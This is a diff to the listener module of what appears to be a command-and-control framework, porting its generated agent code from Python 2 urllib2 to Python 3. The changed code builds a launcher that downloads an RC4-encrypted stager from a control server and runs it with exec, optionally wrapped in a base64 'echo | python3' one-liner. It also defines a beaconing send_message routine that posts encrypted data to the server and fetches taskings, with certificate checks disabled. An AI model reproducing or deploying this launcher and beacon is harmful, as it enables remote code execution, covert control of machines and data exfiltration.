@@ -265,7 +265,7 @@ class Listener(object):
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-                launcherBase += "import urllib2;\n"
+                launcherBase += "import urllib.request;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
 
@@ -274,7 +274,7 @@ class Listener(object):
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
-                launcherBase += "req=urllib2.Request(server+t);\n"
+                launcherBase += "req=urllib.request.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
                 launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
@@ -289,52 +289,51 @@ class Listener(object):
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                     else:
                         proto = proxy.Split(':')[0]
-                        launcherBase += "proxy = urllib2.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler({'" + proto + "':'" + proxy + "'});\n"
 
                     if proxyCreds != "none":
                         if proxyCreds == "default":
-                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                         else:
-                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
                             launcherBase += "proxy_auth_handler.add_password(None,'" + proxy + "','" + username + "','" + password + "');\n"
-                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                     else:
-                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                 else:
-                    launcherBase += "o = urllib2.build_opener();\n"
+                    launcherBase += "o = urllib.request.build_opener();\n"
 
                 # install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib2.install_opener(o);\n"
+                launcherBase += "urllib.request.install_opener(o);\n"
 
                 # download the stager and extract the IV
 
-                launcherBase += "a=urllib2.urlopen(req).read();\n"
+                launcherBase += "a=urllib.request.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s';" % (stagingKey)
 
                 # RC4 decryption
-                launcherBase += "S,j,out=range(256),0,[]\n"
-                launcherBase += "for i in range(256):\n"
-                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "S,j,out=list(range(256)),0,[]\n"
+                launcherBase += "for i in list(range(256)):\n"
+                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "i=j=0\n"
                 launcherBase += "for char in data:\n"
                 launcherBase += "    i=(i+1)%256\n"
                 launcherBase += "    j=(j+S[i])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
                 launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase).decode("utf-8")
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (
-                        launchEncoded)
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % launchEncoded
                     return launcher
                 else:
                     return launcherBase
@@ -656,40 +655,37 @@ class Listener(object):
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
-                sendMessage = """
+                sendMessage = f"""
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
-
     global missedCheckins
     global server
     global headers
     global taskURIs
-
     data = None
     if packets:
-        data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
+        encData = aes_encrypt_then_hmac(key, packets)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = "session=%s" % (b64routingPacket)
-
+        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
+        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
 
     try:
-        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
+        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
         return ('200', data)
 
-    except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
+    except urllib.request.HTTPError as HTTPError:
+        # if the server is reached, but returns an error (like 404)
         missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
@@ -697,11 +693,10 @@ def send_message(packets=None):
 
         return (HTTPError.code, '')
 
-    except urllib2.URLError as URLerror:
+    except urllib.request.URLError as URLerror:
         # if the server cannot be reached
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
-
     return ('', '')
 """
                 return updateServers + sendMessage
